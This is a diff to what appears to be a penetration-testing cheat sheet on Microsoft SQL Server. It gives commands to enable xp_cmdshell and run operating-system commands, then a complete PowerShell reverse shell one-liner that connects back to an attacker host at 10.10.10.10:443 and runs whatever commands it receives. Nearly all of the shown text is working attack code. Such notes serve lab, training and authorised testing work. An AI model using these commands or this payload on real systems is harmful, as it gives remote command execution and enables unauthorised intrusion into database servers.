@@ -240,11 +240,12 @@ To connect:
     
 To run shell commands if enabled:   
 
+    enable_xp_cmdshell  #enable if using mssqlclient.py    
     SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';  #check if enabled    
-    sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;    #configure and enable xp_cmdshell   
+    sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;    #configure and enable xp_cmdshell      
     xp_cmdshell 'whoami';    
     
-Get a reverse shell using xp_cmdshell (host rev.ps1 file on attack box):    
+Get a reverse shell using xp_cmdshell (host rev.ps1 file on attack box webserver):    
 
     $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()       
 
